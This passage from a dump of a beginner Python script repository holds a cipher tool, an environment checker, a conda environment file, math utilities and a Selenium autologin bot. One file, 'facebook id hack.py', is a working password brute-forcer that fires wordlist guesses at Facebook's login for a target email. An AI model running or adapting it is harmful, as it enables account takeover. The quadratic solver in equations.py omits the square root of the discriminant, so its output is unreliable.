          "content": "import string\nfrom random import randint\n\n\ndef decrypt():\n    texto = input(\"Input the text to decrypt : \").split(\".\")\n    abecedario = string.printable + \"áéíóúÁÉÍÚÓàèìòùÀÈÌÒÙäëïöüÄËÏÖÜñÑ´\"\n    abecedario2 = []\n    nummoves = int(texto[0])\n    indexs = []\n    finalindexs = []\n    textode1 = texto[1]\n    textode2 = []\n\n    for l in range(0, len(abecedario)):\n        abecedario2.append(abecedario[l])\n\n    for letter in range(0, len(textode1)):\n        textode2.append(textode1[letter])\n\n    for index in range(0, len(textode1)):\n        indexs.append(abecedario.index(textode1[index]))\n\n    for move in range(nummoves, 0):\n        abecedario2 += abecedario2.pop(27)\n\n    for value in indexs:\n        newval = value - nummoves\n        finalindexs.append(newval)\n\n    textofin = \"\"\n\n    for i in range(0, len(finalindexs)):\n        textofin += abecedario2[finalindexs[i]]\n\n    print(textofin)\n\n\ndef encrypt():\n\n    texto = input(\"Input the text to encrypt : \")\n    abecedario = string.printable + \"áéíóúÁÉÍÚÓàèìòùÀÈÌÒÙäëïöüÄËÏÖÜñÑ´\"\n    abecedario2 = []\n    nummoves = randint(1, len(abecedario))\n    indexs = []\n\n    texttoenc = []\n\n    for l in range(0, len(abecedario)):\n        abecedario2.append(abecedario[l])\n\n    for let in range(0, len(texto)):\n        texttoenc.append(texto[let])\n\n    for letter in texto:\n        indexs.append(abecedario2.index(letter))\n\n    for move in range(0, nummoves):\n        abecedario2 += abecedario2.pop(0)\n\n    texto = []\n\n    for i in range(0, len(indexs)):\n        texto.append(abecedario2[indexs[i]])\n        texto.append(\".\")\n\n    fintext = \"\"\n\n    for letter2 in range(0, len(texto), 2):\n        fintext += texto[letter2]\n\n    fintext = str(nummoves) + \".\" + fintext\n\n    print(\"\\Encrypted text : \" + fintext)\n\n\nsel = input(\"What would you want to do?\\n\\n[1] Encrypt\\n[2] Decrypt\\n\\n> \").lower()\n\nif sel in [\"1\", \"encrypt\"]:\n    encrypt()\nelif sel in [\"2\", \"decrypt\"]:\n    decrypt()\nelse:\n    print(\"Unknown selection.\")\n"
        },
        {
          "name": "env_check.py",
          "type": "blob",
          "size": 1.28515625,
          "content": "# Script Name   : env_check.py\n# Author        : Craig Richards\n# Created       : 14th May 2012\n# Last Modified\t: 14 February 2016\n# Version       : 1.0.1\n\n# Modifications\t: 1.0.1 - Tidy up comments and syntax\n\n# Description   : This script will check to see if all of the environment variables I require are set\n\nimport os\n\nconfdir = os.getenv(\n    \"my_config\"\n)  # Set the variable confdir from the OS environment variable\nconffile = \"env_check.conf\"  # Set the variable conffile\nconffilename = os.path.join(\n    confdir, conffile\n)  # Set the variable conffilename by joining confdir and conffile together\n\nfor env_check in open(conffilename):  # Open the config file and read all the settings\n    env_check = (\n        env_check.strip()\n    )  # Set the variable as itself, but strip the extra text out\n    print(\"[{}]\".format(env_check))  # Format the Output to be in Square Brackets\n    newenv = os.getenv(\n        env_check\n    )  # Set the variable newenv to get the settings from the OS what is currently set for the settings out the configfile\n\n    if newenv is None:  # If it doesn't exist\n        print(env_check, \"is not set\")  # Print it is not set\n    else:  # Else if it does exist\n        print(\n            \"Current Setting for {}={}\\n\".format(env_check, newenv)\n        )  # Print out the details\n"
        },
        {
          "name": "environment.yml",
          "type": "blob",
          "size": 22.04296875,
          "content": "﻿name: base\r\nchannels:\r\n  - conda-forge\r\n  - defaults\r\ndependencies:\r\n  - abseil-cpp=20211102.0=hd77b12b_0\r\n  - aiohttp=3.9.0=py311h2bbff1b_0\r\n  - aiosignal=1.2.0=pyhd3eb1b0_0\r\n  - anaconda-anon-usage=0.4.3=py311hfc23b7f_100\r\n  - anaconda-catalogs=0.2.0=py311haa95532_0\r\n  - anaconda-client=1.12.2=py311haa95532_0\r\n  - anaconda-cloud-auth=0.1.4=py311haa95532_0\r\n  - anaconda-navigator=2.5.1=py311haa95532_0\r\n  - anaconda-project=0.11.1=py311haa95532_0\r\n  - anyio=3.5.0=py311haa95532_0\r\n  - appdirs=1.4.4=pyhd3eb1b0_0\r\n  - archspec=0.2.1=pyhd3eb1b0_0\r\n  - argon2-cffi=21.3.0=pyhd3eb1b0_0\r\n  - argon2-cffi-bindings=21.2.0=py311h2bbff1b_0\r\n  - arrow-cpp=11.0.0=ha81ea56_2\r\n  - asttokens=2.0.5=pyhd3eb1b0_0\r\n  - async-lru=2.0.4=py311haa95532_0\r\n  - attrs=23.1.0=py311haa95532_0\r\n  - aws-c-common=0.6.8=h2bbff1b_1\r\n  - aws-c-event-stream=0.1.6=hd77b12b_6\r\n  - aws-checksums=0.1.11=h2bbff1b_2\r\n  - aws-sdk-cpp=1.8.185=hd77b12b_1\r\n  - babel=2.11.0=py311haa95532_0\r\n  - backcall=0.2.0=pyhd3eb1b0_0\r\n  - backports=1.1=pyhd3eb1b0_0\r\n  - backports.functools_lru_cache=1.6.4=pyhd3eb1b0_0\r\n  - backports.tempfile=1.0=pyhd3eb1b0_1\r\n  - backports.weakref=1.0.post1=py_1\r\n  - beautifulsoup4=4.12.2=py311haa95532_0\r\n  - black=23.11.0=py311haa95532_0\r\n  - blas=1.0=mkl\r\n  - bleach=4.1.0=pyhd3eb1b0_0\r\n  - bokeh=3.3.0=py311h746a85d_0\r\n  - boltons=23.0.0=py311haa95532_0\r\n  - boost-cpp=1.82.0=h59b6b97_2\r\n  - bottleneck=1.3.5=py311h5bb9823_0\r\n  - brotli-python=1.0.9=py311hd77b12b_7\r\n  - bzip2=1.0.8=he774522_0\r\n  - c-ares=1.19.1=h2bbff1b_0\r\n  - ca-certificates=2023.12.12=haa95532_0\r\n  - certifi=2023.11.17=py311haa95532_0\r\n  - cffi=1.16.0=py311h2bbff1b_0\r\n  - chardet=4.0.0=py311haa95532_1003\r\n  - charset-normalizer=2.0.4=pyhd3eb1b0_0\r\n  - click=8.1.7=py311haa95532_0\r\n  - cloudpickle=2.2.1=py311haa95532_0\r\n  - clyent=1.2.2=py311haa95532_1\r\n  - colorama=0.4.6=py311haa95532_0\r\n  - comm=0.1.2=py311haa95532_0\r\n  - conda=23.11.0=py311haa95532_0\r\n  - conda-build=3.28.1=py311haa95532_0\r\n  - conda-content-trust=0.2.0=py311haa95532_0\r\n  - conda-index=0.3.0=py311haa95532_0\r\n  - conda-libmamba-solver=23.12.0=py311haa95532_0\r\n  - conda-pack=0.6.0=pyhd3eb1b0_0\r\n  - conda-package-handling=2.2.0=py311haa95532_0\r\n  - conda-package-streaming=0.9.0=py311haa95532_0\r\n  - conda-repo-cli=1.0.75=py311haa95532_0\r\n  - conda-token=0.4.0=pyhd3eb1b0_0\r\n  - conda-verify=3.4.2=py_1\r\n  - console_shortcut=0.1.1=4\r\n  - contourpy=1.2.0=py311h59b6b97_0\r\n  - cryptography=41.0.7=py311h89fc84f_0\r\n  - cytoolz=0.12.2=py311h2bbff1b_0\r\n  - dask=2023.11.0=py311haa95532_0\r\n  - dask-core=2023.11.0=py311haa95532_0\r\n  - debugpy=1.6.7=py311hd77b12b_0\r\n  - decorator=5.1.1=pyhd3eb1b0_0\r\n  - defusedxml=0.7.1=pyhd3eb1b0_0\r\n  - distributed=2023.11.0=py311haa95532_0\r\n  - distro=1.8.0=py311haa95532_0\r\n  - entrypoints=0.4=py311haa95532_0\r\n  - et_xmlfile=1.1.0=py311haa95532_0\r\n  - executing=0.8.3=pyhd3eb1b0_0\r\n  - filelock=3.13.1=py311haa95532_0\r\n  - fmt=9.1.0=h6d14046_0\r\n  - freetype=2.12.1=ha860e81_0\r\n  - frozenlist=1.4.0=py311h2bbff1b_0\r\n  - fsspec=2023.10.0=py311haa95532_0\r\n  - future=0.18.3=py311haa95532_0\r\n  - gflags=2.2.2=ha925a31_0\r\n  - giflib=5.2.1=h8cc25b3_3\r\n  - glog=0.5.0=hd77b12b_0\r\n  - gmpy2=2.1.2=py311h7f96b67_0\r\n  - grpc-cpp=1.48.2=hfe90ff0_1\r\n  - heapdict=1.0.1=pyhd3eb1b0_0\r\n  - hupper=1.8.1=py311haa95532_0\r\n  - icu=73.1=h6c2663c_0\r\n  - idna=3.4=py311haa95532_0\r\n  - importlib-metadata=6.0.0=py311haa95532_0\r\n  - importlib_metadata=6.0.0=hd3eb1b0_0\r\n  - intake=0.6.8=py311haa95532_0\r\n  - intel-openmp=2023.1.0=h59b6b97_46320\r\n  - ipykernel=6.25.0=py311h746a85d_0\r\n  - ipython=8.15.0=py311haa95532_0\r\n  - jaraco.classes=3.2.1=pyhd3eb1b0_0\r\n  - jedi=0.18.1=py311haa95532_1\r\n  - jinja2=3.1.2=py311haa95532_0\r\n  - jpeg=9e=h2bbff1b_1\r\n  - json5=0.9.6=pyhd3eb1b0_0\r\n  - jsonpatch=1.32=pyhd3eb1b0_0\r\n  - jsonpointer=2.1=pyhd3eb1b0_0\r\n  - jsonschema=4.19.2=py311haa95532_0\r\n  - jsonschema-specifications=2023.7.1=py311haa95532_0\r\n  - jupyter-lsp=2.2.0=py311haa95532_0\r\n  - jupyter_client=8.6.0=py311haa95532_0\r\n  - jupyter_core=5.5.0=py311haa95532_0\r\n  - jupyter_events=0.8.0=py311haa95532_0\r\n  - jupyter_server=2.10.0=py311haa95532_0\r\n  - jupyter_server_terminals=0.4.4=py311haa95532_1\r\n  - jupyterlab=4.0.8=py311haa95532_0\r\n  - jupyterlab_pygments=0.1.2=py_0\r\n  - jupyterlab_server=2.25.1=py311haa95532_0\r\n  - keyring=23.13.1=py311haa95532_0\r\n  - krb5=1.20.1=h5b6d351_0\r\n  - lerc=3.0=hd77b12b_0\r\n  - libarchive=3.6.2=hb62f4d4_2\r\n  - libboost=1.82.0=h3399ecb_2\r\n  - libbrotlicommon=1.0.9=h2bbff1b_7\r\n  - libbrotlidec=1.0.9=h2bbff1b_7\r\n  - libbrotlienc=1.0.9=h2bbff1b_7\r\n  - libclang=14.0.6=default_hb5a9fac_1\r\n  - libclang13=14.0.6=default_h8e68704_1\r\n  - libcurl=8.4.0=h86230a5_1\r\n  - libdeflate=1.17=h2bbff1b_1\r\n  - libevent=2.1.12=h56d1f94_1\r\n  - libffi=3.4.4=hd77b12b_0\r\n  - libiconv=1.16=h2bbff1b_2\r\n  - liblief=0.12.3=hd77b12b_0\r\n  - libmamba=1.5.3=hcd6fe79_0\r\n  - libmambapy=1.5.3=py311h77c03ed_0\r\n  - libpng=1.6.39=h8cc25b3_0\r\n  - libpq=12.15=h906ac69_1\r\n  - libprotobuf=3.20.3=h23ce68f_0\r\n  - libsodium=1.0.18=h62dcd97_0\r\n  - libsolv=0.7.24=h23ce68f_0\r\n  - libssh2=1.10.0=he2ea4bf_2\r\n  - libthrift=0.15.0=h4364b78_2\r\n  - libtiff=4.5.1=hd77b12b_0\r\n  - libuv=1.44.2=hcfcfb64_1\r\n  - libwebp=1.3.2=hbc33d0d_0\r\n  - libwebp-base=1.3.2=h2bbff1b_0\r\n  - libxml2=2.10.4=h0ad7f3c_1\r\n  - locket=1.0.0=py311haa95532_0\r\n  - lz4=4.3.2=py311h2bbff1b_0\r\n  - lz4-c=1.9.4=h2bbff1b_0\r\n  - m2-msys2-runtime=2.5.0.17080.65c939c=3\r\n  - m2-patch=2.7.5=2\r\n  - markupsafe=2.1.1=py311h2bbff1b_0\r\n  - matplotlib-inline=0.1.6=py311haa95532_0\r\n  - menuinst=2.0.1=py311hd77b12b_1\r\n  - mistune=2.0.4=py311haa95532_0\r\n  - mkl=2023.1.0=h6b88ed4_46358\r\n  - mkl-service=2.4.0=py311h2bbff1b_1\r\n  - mkl_fft=1.3.8=py311h2bbff1b_0\r\n  - mkl_random=1.2.4=py311h59b6b97_0\r\n  - more-itertools=10.1.0=py311haa95532_0\r\n  - mpc=1.1.0=h7edee0f_1\r\n  - mpfr=4.0.2=h62dcd97_1\r\n  - mpir=3.0.0=hec2e145_1\r\n  - mpmath=1.3.0=py311haa95532_0\r\n  - msgpack-python=1.0.3=py311h59b6b97_0\r\n  - msys2-conda-epoch=20160418=1\r\n  - multidict=6.0.4=py311h2bbff1b_0\r\n  - mypy_extensions=1.0.0=py311haa95532_0\r\n  - navigator-updater=0.4.0=py311haa95532_1\r\n  - nbclient=0.8.0=py311haa95532_0\r\n  - nbconvert=7.10.0=py311haa95532_0\r\n  - nbformat=5.9.2=py311haa95532_0\r\n  - nest-asyncio=1.5.6=py311haa95532_0\r\n  - networkx=3.1=py311haa95532_0\r\n  - ninja=1.11.1=h91493d7_0\r\n  - notebook=7.0.6=py311haa95532_0\r\n  - notebook-shim=0.2.3=py311haa95532_0\r\n  - numexpr=2.8.7=py311h1fcbade_0\r\n  - numpy=1.24.3=py311hdab7c0b_1\r\n  - numpy-base=1.24.3=py311hd01c5d8_1\r\n  - openjpeg=2.4.0=h4fc8c34_0\r\n  - openpyxl=3.0.10=py311h2bbff1b_0\r\n  - openssl=3.2.0=hcfcfb64_1\r\n  - orc=1.7.4=h623e30f_1\r\n  - overrides=7.4.0=py311haa95532_0\r\n  - packaging=23.1=py311haa95532_0\r\n  - pandas=2.1.4=py311hf62ec03_0\r\n  - pandocfilters=1.5.0=pyhd3eb1b0_0\r\n  - parameterized=0.8.1=pyhd3eb1b0_1\r\n  - parso=0.8.3=pyhd3eb1b0_0\r\n  - partd=1.4.1=py311haa95532_0\r\n  - pathlib=1.0.1=pyhd3eb1b0_1\r\n  - pathspec=0.10.3=py311haa95532_0\r\n  - pcre2=10.42=h0ff8eda_0\r\n  - pickleshare=0.7.5=pyhd3eb1b0_1003\r\n  - pillow=10.0.1=py311h045eedc_0\r\n  - pip=23.3.1=py311haa95532_0\r\n  - pkce=1.0.3=py311haa95532_0\r\n  - pkginfo=1.9.6=py311haa95532_0\r\n  - platformdirs=3.10.0=py311haa95532_0\r\n  - pluggy=1.0.0=py311haa95532_1\r\n  - ply=3.11=py311haa95532_0\r\n  - powershell_shortcut=0.0.1=3\r\n  - prometheus_client=0.14.1=py311haa95532_0\r\n  - prompt-toolkit=3.0.36=py311haa95532_0\r\n  - psutil=5.9.0=py311h2bbff1b_0\r\n  - pure_eval=0.2.2=pyhd3eb1b0_0\r\n  - py-lief=0.12.3=py311hd77b12b_0\r\n  - pyarrow=11.0.0=py311h8a3a540_1\r\n  - pybind11-abi=4=hd3eb1b0_1\r\n  - pycosat=0.6.6=py311h2bbff1b_0\r\n  - pycparser=2.21=pyhd3eb1b0_0\r\n  - pydantic=1.10.12=py311h2bbff1b_1\r\n  - pygments=2.15.1=py311haa95532_1\r\n  - pyjwt=2.4.0=py311haa95532_0\r\n  - pyopenssl=23.2.0=py311haa95532_0\r\n  - pyqt=5.15.10=py311hd77b12b_0\r\n  - pyqt5-sip=12.13.0=py311h2bbff1b_0\r\n  - pysocks=1.7.1=py311haa95532_0\r\n  - python=3.11.5=he1021f5_0\r\n  - python-dateutil=2.8.2=pyhd3eb1b0_0\r\n  - python-dotenv=0.21.0=py311haa95532_0\r\n  - python-fastjsonschema=2.16.2=py311haa95532_0\r\n  - python-json-logger=2.0.7=py311haa95532_0\r\n  - python-libarchive-c=2.9=pyhd3eb1b0_1\r\n  - python-lmdb=1.4.1=py311hd77b12b_0\r\n  - python-snappy=0.6.1=py311hd77b12b_0\r\n  - python-tzdata=2023.3=pyhd3eb1b0_0\r\n  - python_abi=3.11=2_cp311\r\n  - pytorch=2.1.0=cpu_py311hd080823_0\r\n  - pytz=2023.3.post1=py311haa95532_0\r\n  - pywin32=305=py311h2bbff1b_0\r\n  - pywin32-ctypes=0.2.0=py311haa95532_1000\r\n  - pywinpty=2.0.10=py311h5da7b33_0\r\n  - pyyaml=6.0.1=py311h2bbff1b_0\r\n  - pyzmq=25.1.0=py311hd77b12b_0\r\n  - qt-main=5.15.2=h19c9488_10\r\n  - qtpy=2.4.1=py311haa95532_0\r\n  - re2=2022.04.01=hd77b12b_0\r\n  - referencing=0.30.2=py311haa95532_0\r\n  - reproc=14.2.4=hd77b12b_1\r\n  - reproc-cpp=14.2.4=hd77b12b_1\r\n  - requests=2.31.0=py311haa95532_0\r\n  - requests-toolbelt=1.0.0=py311haa95532_0\r\n  - rfc3339-validator=0.1.4=py311haa95532_0\r\n  - rfc3986-validator=0.1.1=py311haa95532_0\r\n  - rpds-py=0.10.6=py311h062c2fa_0\r\n  - ruamel.yaml=0.17.21=py311h2bbff1b_0\r\n  - ruamel_yaml=0.17.21=py311h2bbff1b_0\r\n  - semver=2.13.0=pyhd3eb1b0_0\r\n  - send2trash=1.8.2=py311haa95532_0\r\n  - setuptools=68.2.2=py311haa95532_0\r\n  - sip=6.7.12=py311hd77b12b_0\r\n  - six=1.16.0=pyhd3eb1b0_1\r\n  - snappy=1.1.9=h6c2663c_0\r\n  - sniffio=1.2.0=py311haa95532_1\r\n  - sortedcontainers=2.4.0=pyhd3eb1b0_0\r\n  - soupsieve=2.5=py311haa95532_0\r\n  - sqlite=3.41.2=h2bbff1b_0\r\n  - stack_data=0.2.0=pyhd3eb1b0_0\r\n  - sympy=1.12=py311haa95532_0\r\n  - tbb=2021.8.0=h59b6b97_0\r\n  - tblib=1.7.0=pyhd3eb1b0_0\r\n  - terminado=0.17.1=py311haa95532_0\r\n  - tinycss2=1.2.1=py311haa95532_0\r\n  - tk=8.6.12=h2bbff1b_0\r\n  - toolz=0.12.0=py311haa95532_0\r\n  - tornado=6.3.3=py311h2bbff1b_0\r\n  - tqdm=4.65.0=py311h746a85d_0\r\n  - traitlets=5.7.1=py311haa95532_0\r\n  - truststore=0.8.0=py311haa95532_0\r\n  - typing-extensions=4.7.1=py311haa95532_0\r\n  - typing_extensions=4.7.1=py311haa95532_0\r\n  - tzdata=2023c=h04d1e81_0\r\n  - ucrt=10.0.22621.0=h57928b3_0\r\n  - ujson=5.4.0=py311hd77b12b_0\r\n  - urllib3=1.26.18=py311haa95532_0\r\n  - utf8proc=2.6.1=h2bbff1b_0\r\n  - vc=14.2=h21ff451_1\r\n  - vc14_runtime=14.38.33130=h82b7239_18\r\n  - vs2015_runtime=14.38.33130=hcb4865c_18\r\n  - wcwidth=0.2.5=pyhd3eb1b0_0\r\n  - webencodings=0.5.1=py311haa95532_1\r\n  - websocket-client=0.58.0=py311haa95532_4\r\n  - wheel=0.41.2=py311haa95532_0\r\n  - win_inet_pton=1.1.0=py311haa95532_0\r\n  - winpty=0.4.3=4\r\n  - word2number=1.1=py_0\r\n  - xyzservices=2022.9.0=py311haa95532_1\r\n  - xz=5.4.5=h8cc25b3_0\r\n  - yaml=0.2.5=he774522_0\r\n  - yaml-cpp=0.8.0=hd77b12b_0\r\n  - yarl=1.9.3=py311h2bbff1b_0\r\n  - zeromq=4.3.4=hd77b12b_0\r\n  - zict=3.0.0=py311haa95532_0\r\n  - zipp=3.11.0=py311haa95532_0\r\n  - zlib=1.2.13=h8cc25b3_0\r\n  - zstandard=0.19.0=py311h2bbff1b_0\r\n  - zstd=1.5.5=hd43e919_0\r\n  - pip:\r\n      - asgiref==3.7.2\r\n      - comtypes==1.2.0\r\n      - datetime==5.4\r\n      - django==5.0\r\n      - gtts==2.5.0\r\n      - h11==0.14.0\r\n      - httpcore==1.0.2\r\n      - httpx==0.26.0\r\n      - image==1.5.33\r\n      - imagegrab==0.0.3\r\n      - key==0.4\r\n      - keyboard==0.13.5\r\n      - lxml==4.9.4\r\n      - openai==1.6.1\r\n      - playsound==1.3.0\r\n      - pyaudio==0.2.14\r\n      - pyjokes==0.6.0\r\n      - pynput==1.7.6\r\n      - pypiwin32==223\r\n      - python-docx==1.1.0\r\n      - pyttsx3==2.90\r\n      - speechrecognition==3.10.1\r\n      - sqlparse==0.4.4\r\n      - zope-interface==6.1\r\nprefix: C:\\Users\\playn\\anaconda3\r\n"
        },
        {
          "name": "equations.py",
          "type": "blob",
          "size": 1.1376953125,
          "content": "###\n#####\n####### by @JymPatel\n#####\n###\n\n###\n##### edited by ... (editors can put their name and thanks for suggestion) :)\n###\n\n\n# what we are going to do\nprint(\"We can solve the below equations\")\nprint(\"1  Quadratic Equation\")\n\n# ask what they want to solve\nsinput = input(\"What you would like to solve?\")\n\n# for Qdc Eqn\nif sinput == \"1\":\n    print(\"We will solve for equation 'a(x^2) + b(x) + c'\")\n\n    # value of a\n    a = int(input(\"What is value of a?\"))\n    b = int(input(\"What is value of b?\"))\n    c = int(input(\"What is value of c?\"))\n\n    D = b ** 2 - 4 * a * c\n\n    if D < 0:\n        print(\"No real values of x satisfies your equation.\")\n\n    else:\n        x1 = (-b + D) / (2 * a)\n        x2 = (-b - D) / (2 * a)\n\n        print(\"Roots for your equation are\", x1, \"&\", x2)\n\n\nelse:\n    print(\"You have selected wrong option.\")\n    print(\"Select integer for your equation and run this code again\")\n\n\n# end of code\nprint(\"You can visit https://github.com/JymPatel/Python3-FirstEdition\")\n\n# get NEW versions of equations.py at https://github.com/JymPatel/Python3-FirstEdition with more equations\n# EVEN YOU CAN CONTRIBUTE THEIR. EVERYONE IS WELCOMED THERE..\n"
        },
        {
          "name": "ex20.py",
          "type": "blob",
          "size": 0.658203125,
          "content": "from sys import argv\n\nscript, input_file = argv\n\n\ndef print_all(f):\n    print(f.read())\n\n\n# seek(n) to read a file's content from byte-n\ndef rewind(f):\n    f.seek(0)\n\n\ndef print_a_line(line_count, f):\n    print(line_count, f.readline())\n\n\ncurrent_file = open(input_file)\n\nprint(\"First let's print the whole file:\\n\")\nprint_all(current_file)\n\nprint(\"Now let's rewind, kind of like a tape.\")\nrewind(current_file)\n\nprint(\"Let's print three lines:\")\ncurrent_line = 1\nprint_a_line(current_line, current_file)\n\ncurrent_line = current_line + 1\nprint_a_line(current_line, current_file)\n\ncurrent_line = current_line + 1\nprint_a_line(current_line, current_file)\n\ncurrent_file.close()\n"
        },
        {
          "name": "fF",
          "type": "blob",
          "size": 1.2236328125,
          "content": "# Script Name   : folder_size.py\n# Author        : Craig Richards (Simplified by Assistant)\n# Created       : 19th July 2012\n# Last Modified : 19th December 2024\n# Version       : 2.0.0\n\n# Description   : Scans a directory and subdirectories to display the total size.\n\nimport os\nimport sys\n\ndef get_folder_size(directory):\n    \"\"\"Calculate the total size of a directory and its subdirectories.\"\"\"\n    total_size = 0\n    for root, _, files in os.walk(directory):\n        for file in files:\n            total_size += os.path.getsize(os.path.join(root, file))\n    return total_size\n\ndef format_size(size):\n    \"\"\"Format the size into human-readable units.\"\"\"\n    units = [\"Bytes\", \"KB\", \"MB\", \"GB\", \"TB\"]\n    for unit in units:\n        if size < 1024 or unit == units[-1]:\n            return f\"{size:.2f} {unit}\"\n        size /= 1024\n\ndef main():\n    if len(sys.argv) < 2:\n        print(\"Usage: python folder_size.py <directory>\")\n        sys.exit(1)\n\n    directory = sys.argv[1]\n    \n    if not os.path.exists(directory):\n        print(f\"Error: The directory '{directory}' does not exist.\")\n        sys.exit(1)\n    \n    folder_size = get_folder_size(directory)\n    print(f\"Folder Size: {format_size(folder_size)}\")\n\nif __name__ == \"__main__\":\n    main()\n"
        },
        {
          "name": "facebook id hack.py",
          "type": "blob",
          "size": 1.8837890625,
          "content": "# Author-Kingslayer\n# Email-kingslayer8509@gmail.com\n# you need to create a file password.txt which contains all possible passwords\nimport requests\nimport threading\nimport urllib.request\nimport os\nfrom bs4 import BeautifulSoup\nimport sys\n\nif sys.version_info[0] != 3:\n    print(\n        \"\"\"--------------------------------------\n\tREQUIRED PYTHON 3.x\n\tuse: python3 fb.py\n--------------------------------------\n\t\t\t\"\"\"\n    )\n    sys.exit()\n\npost_url = \"https://www.facebook.com/login.php\"\nheaders = {\n    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\",\n}\npayload = {}\ncookie = {}\n\n\ndef create_form():\n    form = dict()\n    cookie = {\"fr\": \"0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy\"}\n\n    data = requests.get(post_url, headers=headers)\n    for i in data.cookies:\n        cookie[i.name] = i.value\n    data = BeautifulSoup(data.text, \"html.parser\").form\n    if data.input[\"name\"] == \"lsd\":\n        form[\"lsd\"] = data.input[\"value\"]\n    return (form, cookie)\n\n\ndef function(email, passw, i):\n    global payload, cookie\n    if i % 10 == 1:\n        payload, cookie = create_form()\n        payload[\"email\"] = email\n    payload[\"pass\"] = passw\n    r = requests.post(post_url, data=payload, cookies=cookie, headers=headers)\n    if \"Find Friends\" in r.text or \"Two-factor authentication required\" in r.text:\n        open(\"temp\", \"w\").write(str(r.content))\n        print(\"\\npassword is : \", passw)\n        return True\n    return False\n\n\nprint(\"\\n---------- Welcome To Facebook BruteForce ----------\\n\")\nfile = open(\"passwords.txt\", \"r\")\n\nemail = input(\"Enter Email/Username : \")\n\nprint(\"\\nTarget Email ID : \", email)\nprint(\"\\nTrying Passwords from list ...\")\n\ni = 0\nwhile file:\n    passw = file.readline().strip()\n    i += 1\n    if len(passw) < 6:\n        continue\n    print(str(i) + \" : \", passw)\n    if function(email, passw, i):\n        break\n"
        },
        {
          "name": "facebook-autologin-bot.py",
          "type": "blob",
          "size": 1.986328125,
          "content": "import pyttsx3\nimport time\nfrom selenium import webdriver\n\ntts = pyttsx3.init()\nrate = tts.getProperty(\"rate\")\nnewVoiceRate = 160\ntts.setProperty(\"rate\", newVoiceRate)\n\n\ndef welcome():\n    print(\">\")\n    print(\"Welcome to Autobot created by Vijay.Use exit or quite to exit.\")\n    text = \"Welcome to Autobot created by Vijay\"\n    speak(text)\n    time.sleep(1)\n    text = \"Use exit or quite to exit.\"\n    speak(text)\n    print(\"<\")\n\n\ndef speak(text):\n    tts.say(text)\n    tts.runAndWait()\n\n\nwelcome()\nt = 1\nwhile t == 1:\n    text = str(input(\">>\"))\n    if \"hello\" in text:\n        text = \"hello my name is Autobot\"\n        print(\"hello my name is Autobot\")\n        speak(text)\n        text = \"I can autologin to your social sites like facebook twitter github and instagram\"\n        print(\n            \"I can autologin to your social sites like facebook twitter github and instagram\"\n        )\n        speak(text)\n        continue\n    if \"facebook\" or \"fb\" in text:\n        print(\"Opening Your Facebook Account\")\n        text = \"Opening Your Facebook Account\"\n        speak(text)\n        # your username and password here\n        username = \"your username\"\n        password = \"yourpassword\"\n        # download webdriver of suitable version by link below\n        # https://sites.google.com/a/chromium.org/chromedriver/downloads\n        # locate your driver\n        driver = webdriver.Chrome(\"C:\\\\Users\\\\AJAY\\\\Desktop\\\\chromedriver.exe\")\n        url = \"https://www.facebook.com\"\n        print(\"Opening facebook...\")\n        driver.get(url)\n        driver.find_element_by_id(\"email\").send_keys(username)\n        print(\"Entering Your Username...\")\n        time.sleep(1)\n        driver.find_element_by_id(\"pass\").send_keys(password)\n        print(\"Entering Your password...\")\n        driver.find_element_by_name(\"login\").click()\n        time.sleep(4)\n        print(\"Login Successful\")\n        text = \"Login Successful Enjoy your day sir\"\n        speak(text)\n        continue\n    else:\n        print(\"input valid statement\")\n        continue\n"
        },
        {
          "name": "factorial_perm_comp.py",
          "type": "blob",
          "size": 1.8310546875,
          "content": "# Script Name\t\t: factorial_perm_comp.py\n# Author\t\t\t: Ebiwari Williams\n# Created\t\t\t: 20th May 2017\n# Last Modified\t\t:\n# Version\t\t\t: 1.0\n\n# Modifications\t\t:\n\n# Description\t\t: Find Factorial, Permutation and Combination of a Number\n\n\ndef factorial(n):\n    fact = 1\n    while n >= 1:\n        fact = fact * n\n        n = n - 1\n\n    return fact\n\n\ndef permutation(n, r):\n    return factorial(n) / factorial(n - r)\n\n\ndef combination(n, r):\n    return permutation(n, r) / factorial(r)\n\n\ndef main():\n    print(\"choose between operator 1,2,3\")\n    print(\"1) Factorial\")\n    print(\"2) Permutation\")\n    print(\"3) Combination\")\n\n    operation = input(\"\\n\")\n\n    if operation == \"1\":\n        print(\"Factorial Computation\\n\")\n        while True:\n            try:\n                n = int(input(\"\\n Enter  Value for n \"))\n                print(\"Factorial of {} = {}\".format(n, factorial(n)))\n                break\n            except ValueError:\n                print(\"Invalid Value\")\n                continue\n\n    elif operation == \"2\":\n        print(\"Permutation Computation\\n\")\n\n        while True:\n            try:\n                n = int(input(\"\\n Enter Value for n \"))\n                r = int(input(\"\\n Enter Value for r \"))\n                print(\"Permutation of {}P{} = {}\".format(n, r, permutation(n, r)))\n                break\n            except ValueError:\n                print(\"Invalid Value\")\n                continue\n\n    elif operation == \"3\":\n        print(\"Combination Computation\\n\")\n        while True:\n            try:\n                n = int(input(\"\\n Enter Value for n \"))\n                r = int(input(\"\\n Enter Value for r \"))\n\n                print(\"Combination of {}C{} = {}\".format(n, r, combination(n, r)))\n                break\n\n            except ValueError:\n                print(\"Invalid Value\")\n                continue\n\n\nif __name__ == \"__main__\":\n    main()\n"
        },
        {
          "name": "factors.py",
          "type": "blob",
          "size": 0.27734375,
          "content": "import math\n\nprint(\"The factors of the number you type when prompted will be displayed\")\na = int(input(\"Type now // \"))\nb = 1\nwhile b <= math.sqrt(a):\n    if a % b == 0:\n        print(\"A factor of the number is \", b)\n        print(\"A factor of the number is \", int(a / b))\n    b += 1\n"
        },
        {
          "name": "fastapi.py",
          "type": "blob",
          "size": 0.8798828125,
